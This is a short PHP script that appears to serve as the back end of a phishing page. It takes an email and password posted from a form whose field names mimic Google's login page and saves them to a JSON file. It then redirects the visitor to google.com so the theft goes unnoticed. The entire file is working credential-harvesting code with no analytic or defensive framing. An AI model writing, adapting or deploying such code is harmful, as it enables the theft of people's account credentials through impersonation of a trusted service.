<?php
$user = $_POST['Email'];
$pass = $_POST['Passwd'];
$data['dev'][] = array('username' =>$user,
'password'=>$pass);

$jdata = json_encode($data);
$f = fopen('usernames.json', 'w');
fwrite($f, $jdata);
fclose($f);
header('Location: https://google.com/');
exit();

